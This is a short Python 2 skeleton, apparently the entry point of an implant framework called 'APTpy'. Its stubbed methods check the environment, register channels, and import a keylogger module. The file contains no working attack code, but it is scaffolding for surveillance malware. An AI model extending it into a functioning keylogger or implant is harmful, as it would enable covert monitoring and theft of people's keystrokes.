DEBUG = True


class APTpy:
    def __init__(self):
        pass

    def run(self):
        self._checkenv()
        self._registerChannels()
        self._registerModules()

    def _checkenv(self):
        pass

    def _registerChannels(self):
        pass

    def _registerModules(self):
        from lib.modules.keylogger import KeyloggerModule


try:
    obj = APTpy()
    obj.run()
except:
    if DEBUG:
        print "[!] Operation aborted"
